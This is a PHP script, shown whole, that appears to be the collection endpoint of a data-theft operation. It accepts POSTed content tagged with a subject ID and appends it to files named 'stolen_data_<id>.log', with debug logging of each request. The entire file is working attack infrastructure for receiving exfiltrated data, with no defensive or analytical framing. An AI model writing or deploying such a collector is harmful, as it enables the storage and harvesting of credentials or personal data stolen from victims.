<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Define the debug log file
$debugLogFile = 'debug.log';

// Log the initial request
file_put_contents($debugLogFile, "Request received at: " . date('Y-m-d H:i:s') . PHP_EOL, FILE_APPEND);

// Check the request method and parameters
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['content'])) {
    $subjectID = $_POST['subjectID'] ?? 'unknown';
    $data = $_POST['content'];

    // Log the received data
    file_put_contents($debugLogFile, "Subject ID: $subjectID" . PHP_EOL, FILE_APPEND);
    file_put_contents($debugLogFile, "Data: " . substr($data, 0, 100) . "..." . PHP_EOL, FILE_APPEND); // Log first 100 chars of data

    // Ensure the subjectID is safe to use as a filename
    $safeSubjectID = preg_replace('/[^a-zA-Z0-9_-]/', '_', $subjectID);

    // Create a unique log file name based on the subject ID
    $logFile = "stolen_data_{$safeSubjectID}.log";

    // Log the data to a file
    if (file_put_contents($logFile, $data . PHP_EOL, FILE_APPEND) === false) {
        file_put_contents($debugLogFile, "Failed to write to log file: $logFile" . PHP_EOL, FILE_APPEND);
        echo "Failed to log data.";
    } else {
        file_put_contents($debugLogFile, "Data successfully logged to: $logFile" . PHP_EOL, FILE_APPEND);
        echo "Data received and logged.";
    }
} else {
    // Log the failure
    file_put_contents($debugLogFile, "No data received or invalid request method." . PHP_EOL, FILE_APPEND);
    echo "No data received.";
}
?>
